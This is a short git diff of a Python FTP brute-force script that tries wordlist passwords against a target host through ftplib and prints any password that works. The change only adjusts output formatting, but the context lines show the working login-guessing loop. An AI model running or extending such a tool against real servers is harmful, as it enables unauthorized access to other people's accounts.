@@ -36,14 +36,15 @@ for passwd in passfile:
 
     try:
         ftp = ftplib.FTP(target, username, passwd)
-        print("[+] {0:*^50}".format("Password found :D"))
+        print("[+] {0:*^50}".format("Password found :D\n"))
         print("[+] Password is: {0}".format(passwd))
         print("[+]{0:*^50}".format(""))
         flag = 1
 
     except:
         print("[-] Password Trying...{0}".format(passwd))
-
+	
+print("\n")
 if (flag == 0):
     print ("Password not found :(\n")
     print ("Please modify your wordlist !\n")
